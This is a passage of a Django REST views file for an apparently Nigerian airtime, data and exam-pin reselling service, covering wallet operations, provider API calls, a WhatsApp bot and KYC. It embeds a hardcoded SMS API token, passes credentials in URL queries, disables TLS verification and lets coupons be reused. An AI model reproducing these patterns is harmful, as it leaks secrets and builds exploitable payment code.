        serializer = CouponPaymentSerializer(items, many=True)
        return Response(serializer.data)

    def post(self, request, format=None):
        status = "successful"
        fund = 0
        serializer = CouponPaymentSerializer(
            data=request.data, context={'request': request})

        if serializer.is_valid():
            user = (serializer.validated_data["user"])
            Code = serializer.validated_data["Code"]

            if Couponcode.objects.filter(Coupon_Code=Code).exists():

                ms = Couponcode.objects.get(Coupon_Code=Code).amount
                amount = Couponcode.objects.get(Coupon_Code=Code).amount
                previous_bal1 = user.Account_Balance
                user.deposit(user.id, float(ms),False ,"Coupon payment from API")
                sta = Couponcode.objects.get(Coupon_Code=Code)
                sta.Used = True

                sta.save()
                Wallet_summary.objects.create(user=user, product="Coupon Payment  N{} ".format(
                    amount), amount=amount, previous_balance=previous_bal1, after_balance=(previous_bal1 - float(amount)))

            serializer.save(Status=status, amount=amount)

            return Response(serializer.data, status=201)
        return Response(serializer.errors, status=400)


class Airtime_fundingAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = Airtime_funding.objects.filter(
            user=request.user).order_by('-create_date')
        serializer = Airtime_fundingSerializer(items, many=True)
        return Response(serializer.data)

    def post(self, request, format=None):
        status = "pending"
        fund = 0
        serializer = Airtime_fundingSerializer(
            data=request.data, context={'request': request})

        if serializer.is_valid():
            user = (serializer.validated_data["user"])
            network = (serializer.validated_data["network"])
            amount = (serializer.validated_data["amount"])
            number = (serializer.validated_data["mobile_number"])
            fund_wallet = (serializer.validated_data["use_to_fund_wallet"])

            perc = Percentage.objects.get(
                network=Network.objects.get(name=network))
            Receivece_amount = float(amount) * int(perc.percent)/100

            def sendmessage(sender, message, to, route):
                payload = {
                    'sender': sender,
                    'to': to,
                    'message': message,
                    'type': '0',
                    'routing': route,
                    'token': 'cYTj0CCFuGM4PSrvABkoANCBNlNF2SoipZFSNlz5hmKnejg6fubGLFu7Ph2URDj22dWGYjlRqDILQz7kHxARBlAwdC4CpTKHGC5D',
                    'schedule': '',
                }

                baseurl = f'https://sms.hollatags.com/api/send/?user={config.hollatag_username}&pass={config.hollatag_password}&to={to}&from={sender}&msg={urllib.parse.quote(message)}'
                response = requests.get(baseurl, verify=False)

            sendmessage('Msorg', "{0} want to fund his/her account with  airtime transfer network: {1} amount:{2} Phone number:{3} https://www.yuniqtelecoms.com/page-not-found-error/page/app/Airtime_funding/".format(
                user.username, network, amount, number), f"{config.sms_notification_number}", '03')

            # serializer.save(Receivece_amount=Receivece_amount, AccountName=user.AccountName,
            #                 BankName=user.BankName, AccountNumber=user.AccountNumber)
            serializer.save(Receivece_amount=Receivece_amount, AccountName=user.AccountName,BankName=user.BankName, AccountNumber=user.AccountNumber,use_to_fund_wallet=fund_wallet)

            return Response(serializer.data, status=201)
        return Response(serializer.errors, status=400)


class WithdrawAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = Withdraw.objects.filter(
            user=request.user).order_by('-create_date')
        serializer = WithdrawSerializer(items, many=True)
        return Response(serializer.data)

    def post(self, request, format=None):
        status = "successful"
        fund = 0
        serializer = WithdrawSerializer(
            data=request.data, context={'request': request})

        if serializer.is_valid():
            user = (serializer.validated_data["user"])
            amount = (serializer.validated_data["amount"])
            bankaccount = (serializer.validated_data['accountNumber'])
            name = (serializer.validated_data['accountName'])
            bankname = (serializer.validated_data['bankName'])
            errors = {}

            amt = float(amount) + 100

            def sendmessage(sender, message, to, route):
                payload = {
                    'sender': sender,
                    'to': to,
                    'message': message,
                    'type': '0',
                    'routing': route,
                    'token': 'cYTj0CCFuGM4PSrvABkoANCBNlNF2SoipZFSNlz5hmKnejg6fubGLFu7Ph2URDj22dWGYjlRqDILQz7kHxARBlAwdC4CpTKHGC5D',
                    'schedule': '',
                }

                baseurl = f'https://sms.hollatags.com/api/send/?user={config.hollatag_username}&pass={config.hollatag_password}&to={to}&from={sender}&msg={urllib.parse.quote(message)}'
                response = requests.get(baseurl, verify=False)

            previous_bal = user.Account_Balance

            check = user.withdraw(user.id, float(amt))
            if check == False:
                errors['error'] = u'Y insufficient balance '
                raise serializers.ValidationError(errors)
            Wallet_summary.objects.create(user=user, product="Withdraw   N{}  with N100 charge".format(
                amount), amount=amt, previous_balance=previous_bal, after_balance=(previous_bal - float(amt)))

            sendmessage('datavilla', "{0} want to withdraw   amount:{1} to {2} {3} {4}   https://www.datavilla.ng/way/to/app/admin/app/withdraw/".format(
                user.username, amount, bankname, bankaccount, name), f"{config.sms_notification_number}", '2')

            serializer.save(Status=status)

            return Response(serializer.data, status=201)
        return Response(serializer.errors, status=400)


class TransferAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = Transfer.objects.filter(
            user=request.user).order_by('-create_date')
        serializer = TransferSerializer(items, many=True)
        return Response(serializer.data)

    def post(self, request, format=None):
        status = "successful"
        fund = 0
        serializer = TransferSerializer(
            data=request.data, context={'request': request})

        if serializer.is_valid():
            user = (serializer.validated_data["user"])
            amount = (serializer.validated_data["amount"])
            receiver_username = (
                serializer.validated_data['receiver_username'])
            errors = {}

            mb_2 = CustomUser.objects.get(username__iexact=receiver_username)
            previous_bal1 = user.Account_Balance
            previous_bal2 = mb_2.Account_Balance

            check = user.withdraw(user.id, float(amount))
            if check == False:
                errors['error'] = u'Y insufficient balance '
                raise serializers.ValidationError(errors)

            mb_2.deposit(mb_2.id, float(amount),True ,"Wallet to Wallet from API")
            notify.send(mb_2, recipient=mb_2, verb='You Received sum of #{} from {} '.format(
                amount, user.username))

            Wallet_summary.objects.create(user=user, product="Transfer N{} to {}".format(
                amount, mb_2.username), amount=amount, previous_balance=previous_bal1, after_balance=(previous_bal1 - float(amount)))

            Wallet_summary.objects.create(user=mb_2, product="Received sum N{} from {}".format(
                amount, user.username), amount=amount, previous_balance=previous_bal2, after_balance=(previous_bal2 + float(amount)))

            serializer.save(Status=status, previous_balance=previous_bal1, after_balance=(
                previous_bal1 + float(amount)))

            return Response(serializer.data, status=201)
        return Response(serializer.errors, status=400)


class bonus_transferAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = bonus_transfer.objects.filter(
            user=request.user).order_by('-create_date')
        serializer = bonus_transferSerializer(items, many=True)
        return Response(serializer.data)

    def post(self, request, format=None):
        status = "successful"
        fund = 0
        serializer = bonus_transferSerializer(
            data=request.data, context={'request': request})

        if serializer.is_valid():
            user = (serializer.validated_data["user"])
            amount = (serializer.validated_data["amount"])

            previous_bal1 = user.Account_Balance
            

            user.ref_withdraw(float(amount))
            user.deposit(user.id, float(amount) ,True ,"Bonus to wallet from API")
            notify.send(user, recipient=user, verb='#{} referer bonus has been added to your wallet,refer more people to get more bonus'.format(amount))

            Wallet_summary.objects.create(user=user, product="referer bonus to wallet N{} ".format(amount), amount=amount, previous_balance=previous_bal1, after_balance=(previous_bal1 - float(amount)))

            serializer.save()

            return Response(serializer.data, status=201)
        return Response(serializer.errors, status=400)


# whatappp bot


@require_POST
@csrf_exempt
def replybot(request):
    text1 = request.POST.get('Body')
    response = MessagingResponse()

    if not ("log_in" in request.session):
        request.session["log_in"] = False
        #print(request.session["log_in"], "ww2222")

    elif True:
        #print(request.session["log_in"], "ww223333333322")

        response.message(
            'Welcome to MsorgSMEBOT enter your username and password seperate with comma to start i.e musa,12345')
        #request.session["level"] = request.session["level"] + 1

        if not ',' in text1:
            #response = MessagingResponse()
            response.message(
                "Please enter your username and password seperate with comma to start i.e musa,12345")

        else:
            username = text1.split(',')[0]
            password = text1.split(',')[1]

            headers = {'Content-Type': 'application/json'}
            url = "https://www.IMCdata.com/rest-auth/login/"
            data = {"username": username, "password": password}
            c = requests.post(url, data=json.dumps(data), headers=headers)
            a = json.loads(c.text)

            if "key" in a:
                response = MessagingResponse()
                response.message("Login successful")
                request.session["log_in"] = True

                #request.session["log_in"] = True

            else:
                response = MessagingResponse()
                response.message("Unable to log in with provided credentials.")

    if request.session["log_in"] == True:
        #print(request.session["log_in"], "ww2233333tuyuyyu33322")

        response = MessagingResponse()
        response.message(
            'Welcome back {0}\n 1.Buy Data \n2.Buy Airtime \n3.Cable subscription \n4.Bill payment'.format(username))
        if text1 == "1":
            response = MessagingResponse()
            response.message("data")
        elif text1 == "2":
            response = MessagingResponse()
            response.message("airtime")
        elif text1 == "3":
            response = MessagingResponse()
            response.message("cable")
        elif text1 == "4":
            response = MessagingResponse()
            response.message("bill")

    return HttpResponse(response)


# Result_Checker_Pin_order api

class Result_Checker_Pin_orderAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, id, format=None):
        try:
            item = Result_Checker_Pin_order.objects.filter(
                user=request.user).get(pk=id)
            serializer = Result_Checker_Pin_orderSerializer(item)
            return Response(serializer.data)
        except Result_Checker_Pin_order.DoesNotExist:
            return Response(status=404)


class Result_Checker_Pin_orderAPIListView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = Result_Checker_Pin_order.objects.filter(
            user=request.user).order_by('-create_date')
        paginator = PageNumberPagination()
        result_page = paginator.paginate_queryset(items, request)
        serializer = Result_Checker_Pin_orderSerializer(result_page, many=True)
        return paginator.get_paginated_response(serializer.data)

    def post(self, request, format=None):
        status = "processing"
        fund = 0
        serializer = Result_Checker_Pin_orderSerializer(
            data=request.data, context={'request': request})

        if serializer.is_valid():
            order_username = (serializer.validated_data["user"]).username
            exam = serializer.validated_data["exam_name"]
            quantity = serializer.validated_data["quantity"]
            exam_name = exam
            errors = {}
            control = Result_Checker_Pin.objects.get(exam_name=exam)


            provider_amount = round(control.provider_amount)
            #print(provider_amount)

            if request.user.user_type == "Affilliate":
                amount = Result_Checker_Pin.objects.get(
                    exam_name=exam).Affilliate_price

            elif request.user.user_type == "TopUser":
                amount = Result_Checker_Pin.objects.get(
                    exam_name=exam).TopUser_price

            elif request.user.user_type == "API":
                amount = Result_Checker_Pin.objects.get(
                    exam_name=exam).api_price
            else:
                amount = Result_Checker_Pin.objects.get(exam_name=exam).amount

            amt = amount * quantity
            user = (serializer.validated_data["user"])
            previous_bal = user.Account_Balance
            errors = {}
            data = {}

            def create_id():
                num = random.randint(1, 10070)
                num_2 = random.randint(1, 1056500)
                num_3 = random.randint(1, 1000)
                return str(num_2)+str(num_3)+str(uuid.uuid4())[:8]

            ident = create_id()

            if config.ResultCheckerSource == "API":
                if exam_name == "WAEC":

                    if quantity == 1:
                        q = "WRCONE"

                    elif quantity == 2:
                        q = "WRCTWO"
                    elif quantity == 3:
                        q = "WRCTHR"
                    elif quantity == 4:
                        q = "WRCFOU"
                    elif quantity == 5:
                        q = "WRCFIV"


                    if control.provider_api == "MOBILENIG":
                                #print('hi')
                                #print(f"https://mobilenig.com/API/bills/waec?username={config.mobilenig_username}&api_key={config.mobilenig_api_key}&product_code={q}&price={provider_amount*quantity}&trans_id={ident}")
                                #try:

                                check = user.withdraw(user.id, float(amt))
                                if check == False:
                                    errors['error'] = u' insufficient balance '
                                    raise serializers.ValidationError(errors)

                                Wallet_summary.objects.create(user=user, product="{} WAEC EPIN GENERATED  N{} ".format(quantity, amt), amount=amt, previous_balance=previous_bal, after_balance=(previous_bal + float(amt)))

                                resp = requests.get(f"https://mobilenig.com/API/bills/waec_test?username={config.mobilenig_username}&api_key={config.mobilenig_api_key}&product_code={q}&price={provider_amount*quantity}&trans_id={ident}")
                                status = 'successful'
                                #print(resp.text)
                                ab = json.loads(resp.text)
                                data = resp.text
                                #print(data)

                    elif control.provider_api == "MSORG WEB":
                        check = user.withdraw(user.id,float(amt))
                        if check == False:
                            errors['error'] = u' insufficient balance '
                            raise serializers.ValidationError(errors)

                        Wallet_summary.objects.create(user= user, product="{} WAEC EPIN GENERATED  N{} ".format(quantity,amt), amount = amt, previous_balance = previous_bal, after_balance= (previous_bal + float(amt)))
                        
                        
                        # 
                        url =f"{config.msorg_web_url}/api/epin/"
                        headers = {
                            'Content-Type':'application/json',
                            'Authorization': f'Token {config.msorg_web_api_key}'
                            }
                        param  = {"exam_name": exam_name,"quantity": quantity}
                        param_data = json.dumps(param)
                        response = requests.post(url, headers=headers, data=param_data, verify=False)
                        data = response.text
                        print(response.text) 


                    elif control.provider_api == "EASYACCESS":
                        api_token = str(config.easyaccess_api_key)
                        try:
                            if quantity > 10:
                                errors['error'] = u'you can only generate up to 10 pins at a time'
                                raise serializers.ValidationError(errors)

                            else:
                                check = user.withdraw(user.id,float(amt))
                                if check == False:
                                    errors['error'] = u' insufficient balance '
                                    raise serializers.ValidationError(errors)

                                Wallet_summary.objects.create(user= user, product="{} WAEC EPIN GENERATED  N{} ".format(quantity,amt), amount = amt, previous_balance = previous_bal, after_balance= (previous_bal + float(amt)))

                                url = "https://easyaccess.com.ng/api/waec_v2.php"
                                payload={'no_of_pins': quantity}
                                files=[]
                                headers = {
                                    'AuthorizationToken': api_token
                                }
                                headers.update({"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"})

                                response = requests.request("POST", url, headers=headers, data=payload, files=files)
                                data = response.text
                                status = 'successful'

                        except:
                            errors = {}
                            errors['error'] = u'Service is not currently available'
                            raise serializers.ValidationError(errors)


                    else:
                            check = user.withdraw(user.id,float(amt))
                            if check == False:
                                errors['error'] = u' insufficient balance '
                                raise serializers.ValidationError(errors)

                            Wallet_summary.objects.create(user= user, product="{} WAEC EPIN GENERATED  N{} ".format(quantity,amt), amount = amt, previous_balance = previous_bal, after_balance= (previous_bal + float(amt)))

                            data = {"variation_code": "waecdirect","serviceID":"waec","phone":request.user.Phone,"request_id":ident,"quantity":quantity}
                            #print(data)
                            authentication = (f'{config.vtpass_email}', f'{config.vtpass_password}')
                            resp = requests.post("https://vtpass.com/api/pay",data= data,auth=authentication)
                            #print(resp.text)


                            status = 'successful'


                            try:

                                    a = json.loads(resp.text)
                                    status = 'successful'
                                    data = a["purchased_code"]
                            except:

                                try:
                                    url = 'https://vtpass.com/api/requery'
                                    data = {"request_id":ident}
                                    authentication = (f'{config.vtpass_email}', f'{config.vtpass_password}')
                                    resp = requests.post(url,data= data,auth=authentication)

                                    a = json.loads(resp.text)
                                    data = a["purchased_code"]
                                except:
                                    pass


                elif exam_name == "NECO":
                    if quantity == 1:
                        q = "NECONE"

                    elif quantity == 2:
                        q = "NECTWO"
                    elif quantity == 3:
                        q = "NECTHR"
                    elif quantity == 4:
                        q = "NECFOU"
                    elif quantity == 5:
                        q = "NECFIV"
                    if control.provider_api == "MOBILENIG":
                            #try:

                            check = user.withdraw(user.id, float(amt))
                            if check == False:
                                errors['error'] = u'Y insufficient balance '
                                raise serializers.ValidationError(errors)
                            Wallet_summary.objects.create(user=user, product="{} NECO EPIN GENERATED  N{} ".format(
                                quantity, amt), amount=amt, previous_balance=previous_bal, after_balance=(previous_bal + float(amt)))

                            resp = requests.get(
                            f"https://mobilenig.com/API/bills/neco?username={config.mobilenig_username}&api_key={config.mobilenig_api_key}&product_code={q}&price={provider_amount*quantity}&trans_id={ident}")

                            status = 'successful'
                            #print(resp.text)
                            ab = json.loads(resp.text)
                            # data = resp.text
                            data = ab["details"]["tokens"]
                            #print(data)

                    elif control.provider_api == "MSORG WEB":
                        check = user.withdraw(user.id, float(amt))
                        if check == False:
                            errors['error'] = u'Y insufficient balance '
                            raise serializers.ValidationError(errors)
                        Wallet_summary.objects.create(user=user, product="{} NECO EPIN GENERATED  N{} ".format(
                            quantity, amt), amount=amt, previous_balance=previous_bal, after_balance=(previous_bal + float(amt)))
                            
                        url =f"{config.msorg_web_url}/api/epin/"
                        headers = {
                            'Content-Type':'application/json',
                            'Authorization': f'Token {config.msorg_web_api_key}'
                            }
                        param  = {"exam_name": exam_name,"quantity": quantity}
                        param_data = json.dumps(param)
                        response = requests.post(url, headers=headers, data=param_data, verify=False)
                        data = response.text
                        print(response.text) 
                        
                    
                    
                    elif control.provider_api == "EASYACCESS":
                        api_token = str(config.easyaccess_api_key)
                        try:
                            if quantity > 10:
                                errors['error'] = u'you can only generate up to 10 pins at a time'
                                raise serializers.ValidationError(errors)

                            else:
                                check = user.withdraw(user.id, float(amt))

                                if check == False:
                                    errors['error'] = u'Y insufficient balance '
                                    raise serializers.ValidationError(errors)

                                Wallet_summary.objects.create(user=user, product="{} NECO EPIN GENERATED  N{} ".format(quantity, amt), amount=amt, previous_balance=previous_bal, after_balance=(previous_bal + float(amt)))

                                url = "https://easyaccess.com.ng/api/neco_v2.php"

                                payload={'no_of_pins': quantity}
                                files=[]
                                headers = {
                                    'AuthorizationToken': api_token
                                }
                                headers.update({"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"})

                                response = requests.request("POST", url, headers=headers, data=payload, files=files)
                                data = response.text
                                status = 'successful'

                        except:
                            errors = {}
                            errors['error'] = u'Service is not currently available'
                            raise serializers.ValidationError(errors)

                    else:
                            errors = {}
                            errors['error'] = u'Service is not currently available'
                            raise serializers.ValidationError(errors)

                elif exam_name == "NABTEB":
                    try:
                        if quantity > 10:
                            errors['error'] = u'you can only generate up to 10 pins at a time'
                            raise serializers.ValidationError(errors)

                        else:
                            if control.provider_api == "MSORG WEB":
                                check = user.withdraw(user.id,float(amt))
                                if check == False:
                                    errors['error'] = u' insufficient balance '
                                    raise serializers.ValidationError(errors)
    
                                Wallet_summary.objects.create(user= user, product="{} NABTEB EPIN GENERATED  N{} ".format(quantity,amt), amount = amt, previous_balance = previous_bal, after_balance= (previous_bal + float(amt)))
                                
                                url =f"{config.msorg_web_url}/api/epin/"
                                headers = {
                                    'Content-Type':'application/json',
                                    'Authorization': f'Token {config.msorg_web_api_key}'
                                    }
                                param  = {"exam_name": exam_name,"quantity": quantity}
                                param_data = json.dumps(param)
                                response = requests.post(url, headers=headers, data=param_data, verify=False)
                                data = response.text
                                print(response.text) 
                                    
                            else:
                                check = user.withdraw(user.id,float(amt))
                                if check == False:
                                    errors['error'] = u' insufficient balance '
                                    raise serializers.ValidationError(errors)

                                Wallet_summary.objects.create(user= user, product="{} NABTEB EPIN GENERATED  N{} ".format(quantity,amt), amount = amt, previous_balance = previous_bal, after_balance= (previous_bal + float(amt)))

                                url = "https://easyaccess.com.ng/api/nabteb_v2.php"

                                payload={'no_of_pins': quantity}
                                files=[]
                                headers = {
                                    'AuthorizationToken': str(config.easyaccess_api_key)
                                }
                                headers.update({"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"})

                                response = requests.request("POST", url, headers=headers, data=payload, files=files)
                                data = response.text
                                status = 'successful'

                    except:
                        errors = {}
                        errors['error'] = u'Service is not currently available'
                        raise serializers.ValidationError(errors)

            else:
                check = user.withdraw(user.id, float(amt))
                if check == False:
                    errors['error'] = u'Y insufficient balance '
                    raise serializers.ValidationError(errors)

                Wallet_summary.objects.create(user= user, product="{} {} EPIN GENERATED  N{} ".format(exam_name,quantity,amt), amount = amt, previous_balance = previous_bal, after_balance= (previous_bal - float(amt)))


                if exam_pin.objects.filter(exam = exam).filter(available = True):
                      qs = exam_pin.objects.filter(exam = exam).filter(available = True)[:quantity]
                      jsondata = seria2.serialize('json', qs)
                      data = jsondata
                      for x in qs:
                          x.available = False
                          x.save()

                      print(jsondata)

                else:
                       errors['error'] = u'Education Pin is not Available for {}'.format(exam)
                       raise serializers.ValidationError(errors)


            serializer.save(data=data, amount=amt, previous_balance=previous_bal, after_balance=(
                previous_bal - amt))

            return Response(serializer.data, status=201)
        return Response(serializer.errors, status=400)


# Result_Checker_Pin_order api


##################################################### MANUAL RESULT CHECKER START ########################################
"""
class Result_Checker_Pin_orderAPIView(APIView):
    permission_classes = (IsAuthenticated,)
    def get(self, request, id, format=None):
        try:
            item =Result_Checker_Pin_order.objects.filter(user=request.user).get(pk=id)
            serializer = Result_Checker_Pin_orderSerializer(item)
            return Response(serializer.data)
        except Result_Checker_Pin_order.DoesNotExist:
            return Response(status=404)


class Result_Checker_Pin_orderAPIListView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = Result_Checker_Pin_order.objects.filter(user=request.user).order_by('-create_date')
        paginator = PageNumberPagination()
        result_page = paginator.paginate_queryset(items, request)
        serializer = Result_Checker_Pin_orderSerializer(result_page, many=True)
        return paginator.get_paginated_response(serializer.data)

    def post(self, request, format=None):
        status = "processing"
        fund = 0
        serializer = Result_Checker_Pin_orderSerializer(data=request.data,context={'request': request})

        if serializer.is_valid():
                       user = (serializer.validated_data["user"])
                       exam = serializer.validated_data["exam_name"]
                       quantity = serializer.validated_data["quantity"]
                       exam_name = exam



                       if request.user.user_type == "Affilliate":
                                amount = Exam_pin_price.objects.get(exam_name=exam).Affilliate_price
                       elif request.user.user_type == "TopUser":
                                amount = Exam_pin_price.objects.get(exam_name=exam).TopUser_price

                       elif request.user.user_type == "API":
                                amount = Exam_pin_price.objects.get(exam_name=exam).api_price
                       else:
                                amount = Exam_pin_price.objects.get(exam_name=exam).amount

                       amt = amount * quantity


                       user = (serializer.validated_data["user"])
                       previous_bal = user.Account_Balance
                       errors = {}
                       data = {}

                       def create_id():
                                num = random.randint(1,10070)
                                num_2 = random.randint(1,1056500)
                                num_3 = random.randint(1,1000)
                                return str(num_2)+str(num_3)+str(uuid.uuid4())[:8]

                       ident = create_id()


                       check = user.withdraw(user.id, float(amt))
                       if check == False:
                            errors['error'] = u'Y insufficient balance '
                            raise serializers.ValidationError(errors)

                       print(' ')
                       print('---------------------')
                       print(f"amt = {amt}")

                       Wallet_summary.objects.create(user= user, product="{} {} EPIN GENERATED  N{} ".format(exam_name,quantity,amt), amount = amt, previous_balance = previous_bal, after_balance= (previous_bal + float(amt)))


                       if Result_Checker_Pin.objects.filter(exam_name = exam).filter(Buy = False):
                              qs = Result_Checker_Pin.objects.filter(exam_name = exam).filter(Buy = False)[:quantity]
                              jsondata = seria2.serialize('json', qs)
                              data = jsondata
                              for x in qs:
                                  x.Buy = True
                                  x.save()


                              print(jsondata)
                       else:
                               errors['error'] = u'Education Pin is not Available for {}'.format(exam)
                               raise serializers.ValidationError(errors)



                       serializer.save(data=data ,amount=amt,previous_balance = previous_bal, after_balance =(previous_bal - amt) )

                       return Response(serializer.data, status=201)
        return Response(serializer.errors, status=400)

"""
##################################################### MANUAL RESULT CHECKER END ########################################




class Recharge_pin_orderAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, id, format=None):
        try:
            item = Recharge_pin_order.objects.filter(
                user=request.user).get(pk=id)
            serializer = Recharge_pin_orderSerializer(item)
            return Response(serializer.data)
        except Recharge_pin_order.DoesNotExist:
            return Response(status=404)


class Recharge_pin_orderAPIListView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = Recharge_pin_order.objects.filter(
            user=request.user).order_by('-create_date')
        paginator = PageNumberPagination()
        result_page = paginator.paginate_queryset(items, request)
        serializer = Recharge_pin_orderSerializer(result_page, many=True)
        return paginator.get_paginated_response(serializer.data)

    def post(self, request, format=None):
        status = "processing"
        fund = 0
        serializer = Recharge_pin_orderSerializer(
            data=request.data, context={'request': request})

        if serializer.is_valid():
            order_username = (serializer.validated_data["user"]).username
            network = serializer.validated_data["network"]
            network_amount = serializer.validated_data["network_amount"]
            quantity = serializer.validated_data["quantity"]
            #amount = Result_Checker_Pin.objects.get(exam_name=exam).amount
            #amt = network_amount.amount_to_pay * quantity
            user = (serializer.validated_data["user"])
            previous_bal = user.Account_Balance
            errors = {}

            # print('............RECHARGE PRINTING ORDER............')
            # print(f"network = {network}")
            # print(f"network_amount = {network_amount}")

            myamount = network_amount.amount

            if request.user.user_type == "Affilliate":
                amt = network_amount.Affilliate_price * quantity

            elif request.user.user_type == "TopUser":
                amt = network_amount.TopUser_price * quantity

            elif request.user.user_type == "API":
                amt = network_amount.api_price * quantity
            else:
                amt = network_amount.amount_to_pay * quantity

            def create_id():
                num = random.randint(1, 10070)
                num_2 = random.randint(1, 1056500)
                num_3 = random.randint(1, 1000)
                return str(num_2)+str(num_3)+str(uuid.uuid4())[:8]

            ident = create_id()

            if Recharge_pin.objects.filter(network=Network.objects.get(name=network)).filter(available=True).filter(amount=myamount):
                check = user.withdraw(user.id, float(amt))
                if check == False:
                    errors['error'] = u'Y insufficient balance '
                    raise serializers.ValidationError(errors)
                Wallet_summary.objects.create(user=user, product="{} {}  N{} Airtime pin Generated".format(
                    network.name, quantity, myamount), amount=amt, previous_balance=previous_bal, after_balance=(previous_bal - amt))

                qs = Recharge_pin.objects.filter(network=Network.objects.get(name=network)).filter(
                    available=True).filter(amount=network_amount.amount)[:quantity]
                jsondata = seria2.serialize('json', qs)
                data = jsondata
                for x in qs:
                    x.available = False
                    x.save()

                #print(jsondata)
            else:
                errors['error'] = u'Airtime Pin is not Available on this network currently'
                raise serializers.ValidationError(errors)

            serializer.save(data=data, amount=amt, previous_balance=previous_bal, after_balance=(previous_bal - amt))

            return Response(serializer.data, status=201)
        return Response(serializer.errors, status=400)


class ReferalListView(APIView):
    permission_classes = (IsAuthenticated,)
    def get(self, request, format=None):
        items = Referal_list.objects.filter(user=request.user).order_by('id')
        serializer = Referal_listSerializer(items, many=True)
        return Response(serializer.data)



class KYCCreate(generic.CreateView):
    form_class = KYCForm
    template_name = 'kyc_form.html'

    def form_valid(self, form):
        form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
            [u'use updated browser and retry'])
        return self.form_invalid(form)

        return super(KYCCreate, self).form_valid(form)

#######################################KYC API################################


class KYCAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = KYC.objects.filter(user=request.user)
        serializer = KYCSerializer(items, many=True)
        return Response(serializer.data)

    def post(self, request, format=None):

        serializer = KYCSerializer(
            data=request.data, context={'request': request})

        if serializer.is_valid():
            user = (serializer.validated_data["user"])
            errors = {}
            First_Name = (serializer.validated_data["First_Name"])
            Middle_Name = (serializer.validated_data["Middle_Name"])
            Last_Name = (serializer.validated_data["Last_Name"])
            DOB = (serializer.validated_data["DOB"])
            Gender = (serializer.validated_data["Gender"])
            State_of_origin = (serializer.validated_data["State_of_origin"])
            Local_gov_of_origin = (serializer.validated_data["Local_gov_of_origin"])
            BVN = (serializer.validated_data["BVN"])
            passport_photogragh = (
                serializer.validated_data["passport_photogragh"])
            verify = False

            previous_bal = user.Account_Balance
            if 100 > user.Account_Balance:
                errors['error'] = u'Y insufficient balance '
                raise serializers.ValidationError(errors)



            check = user.withdraw(user.id, 100)

            if check == False:
                errors['error'] = u' insufficient balance '
                raise serializers.ValidationError(errors)

            Wallet_summary.objects.create(user=user, product="BVN VERIFY  N{}  ".format( 100), amount=100, previous_balance=previous_bal, after_balance=(previous_bal - float(100)))



            if KYC.objects.filter(user=user).exists():
                    KYC.objects.filter(user=user).delete()
                    comment = "KYC submitted successfully"
                    message = "Information submitted successful ,Your account verification in process"
                    serializer.save(comment=comment, dump="", primary_details_verified=verify)
                    return Response({"message": message}, status=201)



            else:
                    comment = "KYC submitted successfully"
                    message = "Information submitted successful ,Your account verification in process"
                    serializer.save(comment=comment, dump="", primary_details_verified=verify)
                    return Response({"message": message}, status=201)



        return Response(serializer.errors, status=400)


"""
class KYCAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = KYC.objects.filter(user=request.user)
        serializer = KYCSerializer(items, many=True)
        return Response(serializer.data)

    def post(self, request, format=None):

        serializer = KYCSerializer(
            data=request.data, context={'request': request})

        if serializer.is_valid():
            user = (serializer.validated_data["user"])
            errors = {}
            First_Name = (serializer.validated_data["First_Name"])
            Middle_Name = (serializer.validated_data["Middle_Name"])
            Last_Name = (serializer.validated_data["Last_Name"])
            DOB = (serializer.validated_data["DOB"])
            Gender = (serializer.validated_data["Gender"])
            State_of_origin = (serializer.validated_data["State_of_origin"])
            Local_gov_of_origin = (
                serializer.validated_data["Local_gov_of_origin"])
            BVN = (serializer.validated_data["BVN"])
            passport_photogragh = (
                serializer.validated_data["passport_photogragh"])
            verify = False

            previous_bal = user.Account_Balance
            if 100 > user.Account_Balance:
                errors['error'] = u'Y insufficient balance '
                raise serializers.ValidationError(errors)


            def create_id():
                num = random.randint(1, 10)
                num_2 = random.randint(1, 10)
                num_3 = random.randint(80, 10000)
                return str(num_2)+str(num_3) + str(uuid.uuid4())[:8]

            url = "https://www.idchecker.com.ng/bvn_verify/"

            payload = {"bvn": BVN}

            headers = {
                'Authorization': f'Token {config.idchecker_api_key}',
                'Content-Type': 'application/json', 'User-Agent': 'Custom', 
            }
            #print(config.idchecker_api_key)

            abd = datetime.strptime(str(DOB), '%Y-%m-%d').strftime('%d-%b-%Y')
            response = requests.request("POST", url, headers=headers, data=json.dumps(payload))
            #print(response.text)
            if response.status_code == 200 or  response.status_code == 201 :
                    check = user.withdraw(user.id, 100)

                    if check == False:
                        errors['error'] = u' insufficient balance '
                        raise serializers.ValidationError(errors)

                    Wallet_summary.objects.create(user=user, product="BVN VERIFY  N{}  ".format( 100), amount=100, previous_balance=previous_bal, after_balance=(previous_bal - float(100)))
                    mydata = json.loads(response.text)
                    #print(mydata['response']['data'])

                    if mydata["response"]["responsecode"]  == "00":
                            if KYC.objects.filter(user=user).exists():
                                ab = KYC.objects.filter(user=user).first()
                                if First_Name.upper() == mydata['response']['data']['firstName'].upper() and Middle_Name.upper() == mydata['response']['data']['middleName'].upper() and Last_Name.upper() == mydata['response']['data']['lastName'].upper() and abd == mydata['response']['data']['dateOfBirth'] and Gender == mydata['response']['data']['gender'].upper():
                                    message = "Information submitted successful ,Your account verification in process"
                                    ab.First_Name = First_Name
                                    ab.Middle_Name = Middle_Name
                                    ab.Last_Name = Last_Name
